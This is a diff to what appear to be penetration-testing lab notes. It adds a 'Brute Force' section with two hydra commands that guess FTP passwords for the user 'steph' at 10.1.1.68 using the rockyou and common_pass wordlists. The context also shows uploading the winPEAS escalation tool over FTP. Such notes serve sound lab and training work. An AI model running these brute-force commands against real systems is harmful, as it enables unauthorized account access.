@@ -40,6 +40,11 @@ ftp> binary
 200 Type set to I.
 ftp> put winPEASx86.exe
 ````
+##### Brute Force
+````
+hydra -l steph -P /usr/share/wfuzz/wordlist/others/common_pass.txt 10.1.1.68 -t 4 ftp
+hydra -l steph -P /usr/share/wordlists/rockyou.txt 10.1.1.68 -t 4 ftp
+````
 
 #### SSH port 22
 ##### Emumeration
